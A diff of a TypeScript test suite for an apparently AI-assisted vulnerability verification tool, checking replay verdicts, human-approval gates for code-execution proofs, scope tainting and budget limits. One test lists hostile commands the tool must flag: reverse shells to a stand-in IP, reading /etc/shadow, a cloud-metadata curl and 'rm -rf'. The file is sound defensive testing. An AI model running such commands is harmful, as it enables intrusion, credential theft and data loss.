+          headers: { 'content-type': 'text/html; charset=utf-8' },
+          body: '<!doctype html><html><head><title>App</title></head><body><div id="root">SPA Shell admin_panel_secret_view</div></body></html>',
+        }
+      }
+      if (url.pathname.startsWith('/.guardian-nonexistent-')) {
+        return { status: 404, headers: { 'content-type': 'text/plain' }, body: 'Not Found' }
+      }
+      const hasSubreq = Boolean(opts?.headers?.['x-middleware-subrequest'])
+      if (mode === 'vulnerable' && url.pathname === '/admin' && hasSubreq) {
+        return { status: 200, headers: { 'content-type': 'application/json' }, body: '{"panel":"admin_panel_secret_view"}' }
+      }
+      return { status: 401, headers: { 'content-type': 'application/json' }, body: '{"error":"unauthorized"}' }
+    },
+  })
+
+  const vulnRes = await verifyReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(vulnRes.verdict, 'confirmed')
+  assert.equal(vulnRes.outcome.controlPassed, true)
+  assert.equal(vulnRes.outcome.confirmed, true)
+
+  // One-click Verify Fix retest while still vulnerable -> 'reproduced'
+  const retestBefore = await retestReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(retestBefore.verdict, 'reproduced')
+
+  // Case B: Edge-blocked / patched fixture -> dismissed (ruled out!) and retest -> 'fixed'
+  mode = 'edge_blocked'
+  const blockedRes = await verifyReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(blockedRes.verdict, 'dismissed')
+  assert.equal(blockedRes.outcome.controlPassed, true)
+  assert.equal(blockedRes.outcome.confirmed, false)
+
+  const retestAfter = await retestReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(retestAfter.verdict, 'fixed')
+
+  // Case C: SPA 200 index.html catch-all -> MUST be inconclusive (never confirmed!)
+  mode = 'spa_catchall'
+  const spaCatchallSpec: DeclarativeReplaySpec = {
+    ...cveReplaySpec,
+    // Even if an overly permissive jq tried to confirm on status 200, spaCatchallControl MUST force inconclusive!
+    assertionsJq: '{ controlPassed: true, confirmed: (.steps.probe.status == 200), observed: "200 html", expected: "404" }',
+  }
+  const spaRes = await verifyReplaySpec({ spec: spaCatchallSpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(spaRes.verdict, 'inconclusive')
+  assert.equal(spaRes.outcome.confirmed, false)
+  assert.match(spaRes.outcome.reason ?? '', /SPA catch-all/)
+})
+
+// ============================================================================
+// 7. Zero-LLM Replay Verifier: dns_takeover, tls_audit, browser_dom (Real Playwright!)
+// ============================================================================
+
+test('verifies dns_takeover, tls_audit, and 100%-brokered Playwright browser_dom with third-party abort', { timeout: 30_000 }, async t => {
+  const backend = new LinuxWorkerBackend()
+
+  // dns_takeover
+  let dangling = true
+  const dnsBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    dnsResolver: async () => ({
+      a: dangling ? [] : ['93.184.216.34'],
+      aaaa: [],
+      cname: dangling ? ['unclaimed-org.github.io'] : [],
+      txt: [],
+      ns: [],
+      nxdomain: false,
+    }),
+    transport: async () => ({
+      status: dangling ? 404 : 200,
+      headers: { 'content-type': 'text/html' },
+      body: dangling ? "There isn't a GitHub Pages site here." : 'OK',
+    }),
+  })
+  const dnsSpec: DeclarativeReplaySpec = {
+    ...replayBaseFields(northstar),
+    kind: 'dns_takeover',
+    title: 'Dangling GitHub Pages CNAME Subdomain Takeover',
+    category: 'dns-takeover-infra',
+    cwe: 'CWE-284',
+    targetOrigin: northstar,
+    probePath: '/',
+    assertionsJq: `{
+      controlPassed: ((.dns.hostname | length) > 0),
+      confirmed: (.analysis.likelyTakeover == true),
+      observed: (.dns.cname | join(",")),
+      expected: "No dangling third-party CNAME"
+    }`,
+  }
+  const dnsConfirmed = await verifyReplaySpec({ spec: dnsSpec, broker: dnsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(dnsConfirmed.verdict, 'confirmed')
+  dangling = false
+  const dnsDismissed = await verifyReplaySpec({ spec: dnsSpec, broker: dnsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(dnsDismissed.verdict, 'dismissed')
+
+  // tls_audit
+  let weakTls = true
+  const tlsBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    tlsInspector: async () => ({
+      protocol: weakTls ? 'TLSv1.1' : 'TLSv1.3',
+      cipher: weakTls ? 'AES128-SHA' : 'TLS_AES_256_GCM_SHA384',
+      authorized: !weakTls,
+      authorizationError: weakTls ? 'CERT_HAS_EXPIRED' : null,
+      subject: { CN: 'northstar.example' },
+      issuer: { CN: 'Test CA' },
+      sans: ['northstar.example'],
+      validFrom: '2020-01-01T00:00:00Z',
+      validTo: weakTls ? '2021-01-01T00:00:00Z' : '2030-01-01T00:00:00Z',
+      fingerprint256: 'AA:BB',
+      serialNumber: '01',
+      daysUntilExpiry: weakTls ? -500 : 1000,
+      expired: weakTls,
+      hostnameMatchesSan: true,
+      weakProtocol: weakTls,
+    }),
+  })
+  const tlsSpec: DeclarativeReplaySpec = {
+    ...replayBaseFields(northstar),
+    kind: 'tls_audit',
+    title: 'Deprecated TLSv1.1 and Expired Certificate',
+    category: 'crypto-tls-transport',
+    cwe: 'CWE-327',
+    targetOrigin: northstar,
+    assertionsJq: `{
+      controlPassed: (.tls.tls.protocol != null),
+      confirmed: (.tls.tls.weakProtocol == true or .tls.tls.expired == true),
+      observed: (.tls.tls.protocol + " expired=" + (.tls.tls.expired | tostring)),
+      expected: "TLSv1.2+ with valid certificate"
+    }`,
+  }
+  const tlsConfirmed = await verifyReplaySpec({ spec: tlsSpec, broker: tlsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(tlsConfirmed.verdict, 'confirmed')
+  weakTls = false
+  const tlsDismissed = await verifyReplaySpec({ spec: tlsSpec, broker: tlsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
+  assert.equal(tlsDismissed.verdict, 'dismissed')
+
+  // browser_dom via real Playwright Chromium + 100% RequestBroker routing + third-party trap server
+  let thirdPartyHits = 0
+  const thirdPartyServer = await httpFixture((_req, res) => {
+    thirdPartyHits += 1
+    res.writeHead(200, { 'content-type': 'application/javascript' }).end('window.__thirdPartyRan = true;')
+  })
+  t.after(() => thirdPartyServer.close())
+
+  const brokeredPaths: string[] = []
+  const browserBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async url => {
+      brokeredPaths.push(url.pathname)
+      if (url.pathname === '/api/profile') {
+        return { status: 200, headers: { 'content-type': 'application/json' }, body: '{"user":"alice"}' }
+      }
+      if (url.pathname === '/safe') {
+        return {
+          status: 200,
+          headers: { 'content-type': 'text/html; charset=utf-8' },
+          body: `<!doctype html><html><head><title>Safe Page</title></head><body>
+            <script>
+              window.addEventListener('message', function(e) { if (e.origin === 'https://northstar.example') console.log(e.data); });
+            </script>
+          </body></html>`,
+        }
+      }
+      return {
+        status: 200,
+        headers: { 'content-type': 'text/html; charset=utf-8' },
+        body: `<!doctype html><html><head><title>PostMessage Sink</title></head><body>
+          <script src="${thirdPartyServer.url}/tracker.js"></script>
+          <a href="/account">Account</a>
+          <script>
+            localStorage.setItem('auth_token_key', ['secret', 'storage', 'value', '123'].join('-'));
+            fetch('/api/profile');
+            window.addEventListener('message', function(ev) {
+              document.body.dataset.lastMsg = JSON.stringify(ev.data);
+            });
+          </script>
+        </body></html>`,
+      }
+    },
+  })
+  const scopedBrowser = new ScopedBrowser(browserBroker)
+  const domSpec: DeclarativeReplaySpec = {
+    ...replayBaseFields(northstar),
+    kind: 'browser_dom',
+    title: 'Unchecked postMessage Listener Accepts Untrusted Origins',
+    category: 'cors-client-side',
+    cwe: 'CWE-345',
+    targetOrigin: northstar,
+    controlPath: '/safe',
+    probePath: '/vulnerable',
+    checkKind: 'postmessage',
+    assertionsJq: `{
+      controlPassed: (.control.postMessageListeners.canaryHandledWithoutOriginCheck == false),
+      confirmed: (.probe.postMessageListeners.canaryHandledWithoutOriginCheck == true and ((.probe.blockedOrigins | length) >= 1)),
+      observed: ("unchecked=" + (.probe.postMessageListeners.canaryHandledWithoutOriginCheck | tostring) + ", blocked=" + (.probe.blockedOrigins | join(","))),
+      expected: "All postMessage listeners validate event.origin"
+    }`,
+  }
+  const domRes = await verifyReplaySpec({
+    spec: domSpec,
+    broker: browserBroker,
+    browser: scopedBrowser,
+    backend,
+    grant: makeGrant(),
+    signal: AbortSignal.timeout(25_000),
+  })
+  assert.equal(domRes.verdict, 'confirmed')
+  assert.equal(thirdPartyHits, 0, 'Unapproved third-party subresource MUST NEVER receive a direct socket connection!')
+  assert.ok(brokeredPaths.includes('/safe'))
+  assert.ok(brokeredPaths.includes('/vulnerable'))
+  assert.ok(brokeredPaths.includes('/api/profile'))
+  // Storage value must NOT leak; only key name captured
+  const probePayload = domRes.evidencePayload.probe as { localStorageKeys: string[]; blockedOrigins: string[] }
+  assert.ok(probePayload.localStorageKeys.includes('auth_token_key'))
+  assert.ok(!JSON.stringify(domRes.evidencePayload).includes('secret-storage-value-123'))
+  assert.ok(probePayload.blockedOrigins.some(o => o.startsWith('http://127.0.0.1:')))
+})
+
+// ============================================================================
+// 8. Zero-LLM rce_proof: dynamic_math, split_echo, oob_canary, anti-reflection, denylist & Tier 3 Gate
+// ============================================================================
+
+test('enforces rce_proof cryptographic nonces (dynamic_math, split_echo, oob_canary), blocks raw reflection, destructive payloads, and Tier<3', async () => {
+  const backend = new LinuxWorkerBackend()
+
+  // Destructive payloads rejected by schema & helper
+  for (const bad of [
+    'rm -rf /tmp/x',
+    'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
+    'nc -e /bin/sh 1.2.3.4 4444',
+    'cat /etc/shadow',
+    'curl http://169.254.169.254/latest/meta-data/',
+  ]) {
+    assert.equal(containsDestructivePayload(bad), true, `Must flag destructive payload: ${bad}`)
+  }
+
+  const destructiveSpec = {
+    ...replayBaseFields(northstar),
+    kind: 'rce_proof',
+    proofMode: 'split_echo',
+    requiresTier3Approval: true,
+    controlStep: { id: 'control', role: 'control', description: 'clean', request: { origin: northstar, method: 'POST', pathAndQuery: '/run', textBody: 'hello' } },
+    probeStep: { id: 'probe', role: 'probe', description: 'bad', request: { origin: northstar, method: 'POST', pathAndQuery: '/run', textBody: 'rm -rf / && echo "{{nonce_part1}}""{{nonce_part2}}"' } },
+    assertionsJq: '{ controlPassed: true, confirmed: true, observed: "x", expected: "y" }',
+  }
+  assert.equal(declarativeReplaySpecSchema.safeParse(destructiveSpec).success, false)
+
+  // dynamic_math spec
+  const mathSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
+    ...replayBaseFields(northstar),
+    kind: 'rce_proof',
+    title: 'Server-Side Template Injection (Dynamic Prime Multiplication)',
+    category: 'injection-input',
+    cwe: 'CWE-94',
+    severity: 'critical',
+    proofMode: 'dynamic_math',
+    requiresTier3Approval: true,
+    controlStep: {
+      id: 'control', role: 'control', description: 'Benign template input',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/render', jsonBody: { tpl: 'hello' }, followRedirects: false },
+    },
+    probeStep: {
+      id: 'probe', role: 'probe', description: 'Evaluate fresh unseen prime multiplication',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/render', jsonBody: { tpl: '{{nonce_a}}*{{nonce_b}}' }, followRedirects: false },
+    },
+    assertionsJq: `{
+      controlPassed: (.control.status == 200 and (.proof.productInControl == false)),
+      confirmed: (.proof.mathVerified == true),
+      observed: .probe.bodyPreview,
+      expected: "Expression not evaluated server-side"
+    }`,
+  }
+
+  let evalMode: 'execute' | 'reflect' = 'execute'
+  const mathBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (_url, _addr, _sig, opts) => {
+      const parsed = JSON.parse(opts?.body ?? '{}') as { tpl?: string }
+      const tpl = parsed.tpl ?? ''
+      if (evalMode === 'execute') {
+        const m = /^(\d+)\*(\d+)$/.exec(tpl)
+        if (m) return { status: 200, headers: { 'content-type': 'text/plain' }, body: `Result: ${Number(m[1]) * Number(m[2])}` }
+      }
+      // Raw input reflection!
+      return { status: 200, headers: { 'content-type': 'text/plain' }, body: `Echoed: ${tpl}` }
+    },
+  })
+
+  // Blocked at Tier 2
+  const blockedTier2 = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: makeGrant({ tier: 2 }), signal: AbortSignal.timeout(15_000) })
+  assert.equal(blockedTier2.verdict, 'inconclusive')
+  assert.match(blockedTier2.outcome.reason ?? '', /Tier 3/)
+
+  // Blocked at Tier 3 when HITL approval is false
+  const blockedNoHitl = await verifyReplaySpec({
+    spec: mathSpec, broker: mathBroker, backend,
+    grant: makeGrant({ tier: 3, isStateChangeApproved: () => false }),
+    signal: AbortSignal.timeout(15_000),
+  })
+  assert.equal(blockedNoHitl.verdict, 'inconclusive')
+  assert.match(blockedNoHitl.outcome.reason ?? '', /HITL/)
+
+  const tier3ApprovedGrant = makeGrant({ tier: 3, isStateChangeApproved: () => true })
+
+  // Executing fixture -> confirmed
+  const mathConfirmed = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
+  assert.equal(mathConfirmed.verdict, 'confirmed')
+
+  // Raw reflection fixture -> MUST FAIL confirmation (dismissed)
+  evalMode = 'reflect'
+  const mathReflected = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
+  assert.equal(mathReflected.verdict, 'dismissed')
+  assert.equal(mathReflected.outcome.confirmed, false)
+
+  // split_echo spec
+  const splitSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
+    ...replayBaseFields(northstar),
+    kind: 'rce_proof',
+    title: 'Command Injection (Split-Echo Non-Reflectable Proof)',
+    category: 'injection-input',
+    cwe: 'CWE-78',
+    severity: 'critical',
+    proofMode: 'split_echo',
+    requiresTier3Approval: true,
+    controlStep: {
+      id: 'control', role: 'control', description: 'Benign arg',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/cmd', jsonBody: { cmd: 'echo safe' }, followRedirects: false },
+    },
+    probeStep: {
+      id: 'probe', role: 'probe', description: 'Concatenated split echo',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/cmd', jsonBody: { cmd: 'printf "%s%s" "{{nonce_part1}}" "{{nonce_part2}}"' }, followRedirects: false },
+    },
+    assertionsJq: `{
+      controlPassed: (.control.status == 200),
+      confirmed: (.proof.splitEchoVerified == true),
+      observed: .probe.bodyPreview,
+      expected: "Shell concatenation not executed"
+    }`,
+  }
+
+  let splitMode: 'execute' | 'reflect' = 'execute'
+  const splitBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (_url, _addr, _sig, opts) => {
+      const parsed = JSON.parse(opts?.body ?? '{}') as { cmd?: string }
+      const cmd = parsed.cmd ?? ''
+      if (splitMode === 'execute') {
+        const m = /printf "%s%s" "([^"]+)" "([^"]+)"/.exec(cmd)
+        if (m) return { status: 200, headers: { 'content-type': 'text/plain' }, body: m[1] + m[2] }
+      }
+      return { status: 200, headers: { 'content-type': 'text/plain' }, body: cmd }
+    },
+  })
+  const splitConfirmed = await verifyReplaySpec({ spec: splitSpec, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
+  assert.equal(splitConfirmed.verdict, 'confirmed')
+
+  splitMode = 'reflect'
+  const splitReflected = await verifyReplaySpec({ spec: splitSpec, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
+  assert.equal(splitReflected.verdict, 'dismissed')
+
+  // Adjacent template without concatenation syntax is rejected outright
+  const badSplitTemplate: DeclarativeReplaySpec = {
+    ...splitSpec,
+    probeStep: { ...splitSpec.probeStep, request: { ...splitSpec.probeStep.request, jsonBody: { cmd: '{{nonce_part1}}{{nonce_part2}}' } } },
+  }
+  const splitBadRes = await verifyReplaySpec({ spec: badSplitTemplate, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
+  assert.equal(splitBadRes.verdict, 'inconclusive')
+  assert.match(splitBadRes.outcome.reason ?? '', /separated by execution concatenation/)
+
+  // oob_canary spec with real local CanaryBroker listener
+  const canaryBroker = new CanaryBroker()
+  const oobSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
+    ...replayBaseFields(northstar),
+    kind: 'rce_proof',
+    title: 'Blind Async Command Execution (OOB Canary Proof)',
+    category: 'injection-input',
+    cwe: 'CWE-78',
+    severity: 'critical',
+    proofMode: 'oob_canary',
+    requiresTier3Approval: true,
+    controlStep: {
+      id: 'control', role: 'control', description: 'Control inert request',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/job', jsonBody: { mode: 'noop', url: '{{canary_url}}' }, followRedirects: false },
+    },
+    probeStep: {
+      id: 'probe', role: 'probe', description: 'Trigger benign canary callback',
+      request: { origin: northstar, method: 'POST', pathAndQuery: '/job', jsonBody: { mode: 'exec', url: '{{canary_url}}' }, followRedirects: false },
+    },
+    assertionsJq: `{
+      controlPassed: (.control.status == 202 and (.proof.canaryControlTriggered == false)),
+      confirmed: (.proof.canaryProbeTriggered == true),
+      observed: ("probeCanary=" + (.proof.canaryProbeTriggered | tostring)),
+      expected: "No outbound callback triggered"
+    }`,
+  }
+
+  let triggerProbe = true
+  const oobBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (_url, _addr, _sig, opts) => {
+      const parsed = JSON.parse(opts?.body ?? '{}') as { mode?: string; url?: string }
+      if (triggerProbe && parsed.mode === 'exec' && parsed.url) {
+        // Simulate asynchronous server-side callback to Guardian's local canary listener
+        void fetch(parsed.url, { signal: AbortSignal.timeout(3_000) }).catch(() => undefined)
+      }
+      return { status: 202, headers: { 'content-type': 'application/json' }, body: '{"queued":true}' }
+    },
+  })
+  try {
+    const oobConfirmed = await verifyReplaySpec({
+      spec: oobSpec, broker: oobBroker, canaryBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000),
+    })
+    assert.equal(oobConfirmed.verdict, 'confirmed')
+
+    triggerProbe = false
+    const oobSilent = await verifyReplaySpec({
+      spec: oobSpec, broker: oobBroker, canaryBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000),
+    })
+    assert.equal(oobSilent.verdict, 'dismissed')
+  } finally {
+    await canaryBroker.stop()
   }
 })
 
-test('expires a real worker whose controller keeps stdin open', { timeout: 25_000 }, async () => {
-  const name = 'guardian-' + randomUUID()
-  const args = ['container', 'run', '--rm', '--interactive', '--name', name, '--network', 'none',
-    '--read-only', '--pull', 'never', 'guardian-worker:local']
-  const child = spawn('docker', args, { stdio: ['pipe', 'ignore', 'ignore'], signal: AbortSignal.timeout(22_000) })
-  const filter = ['--filter', 'name=' + name]
-  const running = async () => {
-    for (let attempt = 0; attempt < 60; attempt += 1) {
-      const { stdout } = await exec('docker', ['container', 'ls', '--quiet', ...filter])
-      if (stdout.trim()) return true
-      await delay(50)
+// ============================================================================
+// 9. Transitive Scope-Revocation Tainting, Cold-Graph Digest Compaction, and budget_paused -> Resume
+// ============================================================================
+
+test('transitively taints downstream graph nodes on scope revocation, compacts cold facts into digests, and enforces budget_paused -> resume', async t => {
+  const dir = mkdtempSync(join(tmpdir(), 'guardian-graph-budget-'))
+  t.after(() => rmSync(dir, { recursive: true, force: true }))
+  const storage = new Store(dir)
+  t.after(() => storage.close())
+
+  // Local mock LLM server for ColdGraphCompactor minor digest summarization
+  const llmServer = await httpFixture((req, res) => {
+    req.resume()
+    res.writeHead(200, { 'Content-Type': 'text/event-stream' })
+    res.end([
+      `data: ${JSON.stringify({ type: 'response.output_item.added', output_index: 0, item: { type: 'message', id: 'm1', role: 'assistant', content: [], status: 'in_progress' } })}`,
+      `data: ${JSON.stringify({ type: 'response.output_text.delta', output_index: 0, delta: 'Cold digest summary: recon facts for api.northstar.example.' })}`,
+      `data: ${JSON.stringify({ type: 'response.output_item.done', output_index: 0, item: { type: 'message', id: 'm1', role: 'assistant', content: [{ type: 'output_text', text: 'Cold digest summary: recon facts for api.northstar.example.' }], status: 'completed' } })}`,
+      `data: ${JSON.stringify({ type: 'response.completed', response: { id: 'r1', status: 'completed', output: [], usage: { input_tokens: 200, output_tokens: 40 } } })}`,
+      'data: [DONE]',
+    ].join('\n\n') + '\n\n')
+  })
+  t.after(() => llmServer.close())
+
+  await saveModelProfile({
+    name: 'Compactor Fixture',
+    endpoint: llmServer.url,
+    model: 'compactor-fixture',
+    protocol: 'responses',
+    key: 'compactor-fixture-key-1234',
+    priority: 100,
+  }, storage, { skipConnectionCheck: true })
+
+  const { id: projectId } = storage.createProject({
+    requestId: randomUUID(), name: 'Chain Graph Test', seeds: [northstar, apiOrigin], environment: 'public',
+  })
+  const { id: runId } = storage.createRun({
+    requestId: randomUUID(), projectId, goal: 'Multi-step chain + compaction + budget test', sourceMode: 'public',
+    capabilityTier: 1, budgetUsd: 1.0, budgetRequests: 10, maxRpsPerOrigin: 5, workerConcurrency: 4, workerMaxTurns: 50,
+  })
+  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
+  const assetA = storage.run(runId).candidates.find(c => c.origin === northstar)!
+  const assetB = storage.run(runId).candidates.find(c => c.origin === apiOrigin)!
+  storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0, assetIds: [assetA.id, assetB.id], consent: true })
+
+  const run1 = storage.run(runId)
+  // Step 1 on origin A -> yields Fact 1 (origin A)
+  const step1 = storage.addChainStep(run1, {
+    title: 'Harvest JS from northstar.example',
+    hypothesis: 'Find hidden API paths on api.northstar.example',
+    targetAssetIds: [assetA.id],
+    sourceOrigins: [northstar],
+  })
+  const worker1 = storage.makeWorker(run1, 'investigation', assetA, step1.title, step1.hypothesis, { stepId: step1.id })
+  storage.updateChainStep(step1.id, { status: 'complete', assignedWorkerId: worker1.id })
+  storage.updateWorker(worker1.id, { status: 'complete' })
+  const fact1 = storage.addFact(run1, worker1, {
+    kind: 'endpoint',
+    origin: northstar,
+    summary: 'Found hidden endpoint /api/internal on api.northstar.example',
+    sourceOrigins: [northstar],
+  })
+
+  // Step 2 on origin B dependsOnFactIds: [fact1.id] -> yields Fact 2 (origin B, transitively dependent on A!)
+  const step2 = storage.addChainStep(run1, {
+    title: 'Probe /api/internal on api.northstar.example',
+    hypothesis: 'Test auth bypass on discovered endpoint',
+    targetAssetIds: [assetB.id],
+    dependsOnFactIds: [fact1.id],
+  })
+  const worker2 = storage.makeWorker(run1, 'investigation', assetB, step2.title, step2.hypothesis, {
+    stepId: step2.id,
+    parentFactIds: [fact1.id],
+  })
+  storage.updateChainStep(step2.id, { status: 'complete', assignedWorkerId: worker2.id })
+  storage.updateWorker(worker2.id, { status: 'complete' })
+  const fact2 = storage.addFact(run1, worker2, {
+    kind: 'policy_gap',
+    origin: apiOrigin,
+    summary: 'Auth gap on /api/internal derived from Step 1',
+  })
+
+  // Step 3 on origin B dependsOnStepIds: [step2.id] (still pending/ready)
+  const step3 = storage.addChainStep(run1, {
+    title: 'Verify escalation on api.northstar.example',
+    hypothesis: 'Escalate Step 2 finding',
+    targetAssetIds: [assetB.id],
+    dependsOnStepIds: [step2.id],
+  })
+
+  // Independent completed worker & 5 facts strictly on origin B (NOT dependent on origin A) for cold-graph compaction
+  const cleanWorker = storage.makeWorker(run1, 'investigation', assetB, 'Clean api recon', 'Independent api recon')
+  storage.updateWorker(cleanWorker.id, { status: 'complete' })
+  for (let i = 0; i < 5; i += 1) {
+    storage.addFact(run1, cleanWorker, {
+      kind: 'header',
+      origin: apiOrigin,
+      summary: `Independent api.northstar.example header observation #${i}`,
+    })
+  }
+
+  // Run ColdGraphCompactor across 4 idle planner rounds -> triggers minor compaction!
+  const compactor = new ColdGraphCompactor({ coldAfterRounds: 4, minorThreshold: 5 })
+  const profiles = privateModelProfiles(storage)
+  let triggered: string = 'none'
+  for (let r = 0; r < 5; r += 1) {
+    const res = compactor.onPlannerRound(storage, runId, profiles, AbortSignal.timeout(10_000))
+    if (res.promise) {
+      await res.promise
+      triggered = res.triggered
+      break
     }
-    return false
   }
-  try {
-    const [started, [status]] = await Promise.all([running(), once(child, 'exit')])
-    assert.ok(started, 'The image must reach its running state.')
-    assert.equal(status, 137)
-    const { stdout } = await exec('docker', ['container', 'ls', '--all', '--quiet', ...filter])
-    assert.equal(stdout.trim(), '')
-  } finally {
-    child.stdin.destroy()
-    child.kill()
-    await exec('docker', ['container', 'rm', '--force', name]).catch(() => undefined)
-  }
+  assert.equal(triggered, 'minor')
+  const digests = storage.listDigests(runId, true)
+  assert.ok(digests.length >= 1)
+  const expanded = compactor.expandDigest(storage, runId, digests[0].id)
+  assert.ok(expanded)
+  assert.ok(expanded.facts.length >= 5)
+
+  // Save report v1 BEFORE revoking origin A
+  storage.writeReport(storage.run(runId), true)
+  const reportV1 = storage.runDetail(runId).reports[0]
+  assert.ok(reportV1)
+  const mdV1 = exportReportMarkdown(storage, runId, reportV1.id).content
+
+  // Now REVOKE northstar.example (origin A) while keeping api.northstar.example (origin B)
+  storage.command({
+    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 1, assetIds: [assetB.id], consent: true,
+  })
+
+  // Verify transitive tainting: fact1, fact2, step1, step2, AND step3 are all tainted!
+  const allFactsAfter = storage.listFacts(runId, { includeTainted: true })
+  assert.equal(allFactsAfter.find(f => f.id === fact1.id)?.tainted, true)
+  assert.equal(allFactsAfter.find(f => f.id === fact2.id)?.tainted, true)
+  // Independent origin B facts remain untainted
+  const cleanFactsAfter = storage.listFacts(runId, { includeTainted: false, origin: apiOrigin })
+  assert.equal(cleanFactsAfter.length, 5)
+
+  const allStepsAfter = storage.listChainSteps(runId)
+  assert.equal(allStepsAfter.find(s => s.id === step1.id)?.status, 'tainted')
+  assert.equal(allStepsAfter.find(s => s.id === step2.id)?.status, 'tainted')
+  assert.equal(allStepsAfter.find(s => s.id === step3.id)?.status, 'tainted')
+
+  // Report v1 stays byte-for-byte immutable; new report omits northstar.example
+  assert.equal(exportReportMarkdown(storage, runId, reportV1.id).content, mdV1)
+  storage.writeReport(storage.run(runId), true)
+  const reportV2 = storage.runDetail(runId).reports[0]
+  assert.equal(reportV2.body.scope.some(c => c.origin === northstar), false)
+
+  // Budget governor: spend >= budgetUsd -> budget_paused + partial report -> resume blocked until raise_budget
+  storage.recordLlmSpend(runId, { usd: 1.25, tokens: 50_000, turns: 12 })
+  assert.equal(storage.checkBudgetExceeded(runId), true)
+  assert.equal(storage.run(runId).status, 'budget_paused')
+  assert.throws(
+    () => storage.command({ requestId: randomUUID(), runId, action: 'resume' }),
+    /Raise the run budget/,
+  )
+  storage.command({ requestId: randomUUID(), runId, action: 'raise_budget', budgetUsd: 10.0, resume: true })
+  assert.equal(storage.run(runId).status, 'running')
+  assert.equal(storage.run(runId).budgetUsd, 10.0)
 })
